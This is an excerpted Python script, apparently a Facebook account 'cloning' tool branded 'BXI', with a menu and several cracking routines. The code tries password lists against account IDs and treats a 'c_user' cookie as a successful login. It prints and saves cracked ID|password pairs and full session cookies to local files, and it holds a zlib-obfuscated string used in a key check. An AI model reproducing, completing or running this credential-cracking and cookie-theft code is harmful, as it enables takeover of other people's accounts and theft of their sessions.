...
def option():
    os.system('clear')
    print(logo)
    print(f'[1] Cloning Menu')
    print(f'[2] Create File')
    print(f'[3] Separate Ids')
    print(f'[4] Remove Duplicate IDs')
    print(f'[5] Remove Cookie')
    print(f'[0] Exit Menu')
    print('----------------------------------------------')
...
def cloning():
    ...
    print(f'[*] Public Cloning')
    print(f'[3] Random Cloning (slow)')
    print(f'[4] Random Cloning (Fast With Cookie)')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('OK-BXI.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('CP-BXI.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[OK-BXI] '+cid+' | '+ps+'\n\33[1;37m Cookie | \33[1;32m'+coki+'\033[0;97m')
                open('OK-BXI.txt', 'a').write(cid+' | '+ps+'|'+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        BXI=session.cookies.get_dict().keys()
                        if "c_user" in BXI:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m[OK-BXI] %s | %s'%(ids,pas))
                                open('/sdcard/OK-BXI.txt', 'a').write(ids+'|'+pas+'\n')                                
                                oks.append(ids)
                                
                                break
                        elif 'checkpoint' in BXI:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;31m[CP-BXI] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/CP-BXI.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def getKey():
    ...
    return "BXI-"+myid+xp
km=zlib.decompress(b'x\x8c\xcb())(\xb6\xd2\xd7/(\xca\xcfO3767\xb6\xd4K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd670\xd6O\xaa\xc8,\xa9(\xd1\xcb(\xc9\xcd\xb1\xcf\xb55\x04\x00\n \x12[').decode()
def xi():
    global km
    j=getKey()
